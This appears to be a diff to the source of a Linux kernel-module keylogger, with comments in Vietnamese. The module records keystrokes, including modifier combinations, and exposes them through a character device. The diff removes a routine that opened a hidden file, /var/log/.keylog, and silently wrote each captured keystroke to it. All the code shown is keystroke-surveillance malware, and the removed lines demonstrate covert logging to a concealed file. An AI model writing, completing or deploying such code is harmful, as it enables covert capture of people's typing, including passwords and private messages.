@@ -17,7 +17,6 @@
 
 #define DEVICE_NAME "keylogger"
 #define BUF_SIZE 1024
-#define LOG_PATH "/var/log/.keylog"
 #define MAX_PENDING_CHARS 16 // Đủ dài cho tổ hợp phím như [Ctrl+Alt+Del]
 
 static dev_t dev_num;
@@ -32,7 +31,7 @@ static DECLARE_WAIT_QUEUE_HEAD(keylogger_wq);
 static struct work_struct keylogger_work;
 static char pending_key[MAX_PENDING_CHARS];
 static int pending_count = 0;
-static struct file *log_file;
+
 
 // kiem soat trang thai phim (nhan hay khong nhan)
 static bool left_shift_pressed = false;
@@ -212,18 +211,7 @@ static void keylogger_work_func(struct work_struct *work) {
     spin_unlock_irqrestore(&buf_lock, flags);
 
     wake_up_interruptible(&keylogger_wq);
-
-    if (log_file) {
-        loff_t pos = 0;
-        for (int i = 0; i < pending_count; i++) {
-            printk(KERN_DEBUG "Writing to log: %c\n", pending_key[i]);
-            ssize_t written = kernel_write(log_file, &pending_key[i], 1, &pos);
-            if (written < 0) {
-                printk(KERN_ERR "Failed to write to log file: %ld\n", written);
-            }
-        }
-        vfs_fsync(log_file, 0);
-    }
+    
     pending_count = 0;
 }
 
@@ -321,17 +309,7 @@ static const struct file_operations fops = {
 
 static int __init keylogger_init(void) {
     int ret;
-
-    log_file = filp_open(LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
-    if (IS_ERR(log_file)) {
-        printk(KERN_ERR "Failed to open log file: %ld\n", PTR_ERR(log_file));
-        log_file = NULL;
-    } else if (log_file == NULL) {
-        printk(KERN_ERR "Log file pointer is NULL\n");
-    } else {
-        printk(KERN_INFO "Log file opened successfully\n");
-    }
-
+    
     INIT_WORK(&keylogger_work, keylogger_work_func);
     spin_lock_init(&buf_lock);
 
@@ -383,10 +361,6 @@ static void __exit keylogger_exit(void) {
     class_destroy(keylogger_class);
     cdev_del(&keylogger_cdev);
     unregister_chrdev_region(dev_num, 1);
-    if (log_file) {
-        filp_close(log_file, NULL);
-        printk(KERN_INFO "Log file closed.\n");
-    }
     printk(KERN_INFO "Keylogger unloaded.\n");
 }
 
